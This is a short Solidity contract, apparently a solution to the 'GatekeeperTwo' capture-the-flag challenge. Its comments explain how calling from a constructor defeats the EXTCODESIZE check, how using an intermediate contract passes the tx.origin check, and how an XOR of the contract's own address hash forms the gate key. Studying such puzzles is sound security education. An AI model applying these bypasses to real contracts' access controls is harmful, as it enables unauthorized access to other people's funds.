pragma solidity ^0.6.0;

interface IGatekeeperTwo {

    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperHack{
    // contract is needed in order to pass gateOne (msg.sender!=tx.origin)

    constructor(address instance) public payable {
        // we need to call the enter from the constructor in order to pass gateTwo
        // EXTCODESIZE returns the size of the caller contract,
        // however it will return 0 if the call is made from the constructor

        bytes8 gateKey = bytes8((uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ (uint64(0) - 1));
        IGatekeeperTwo gate = IGatekeeperTwo(instance);
        gate.enter(gateKey);
    }
}
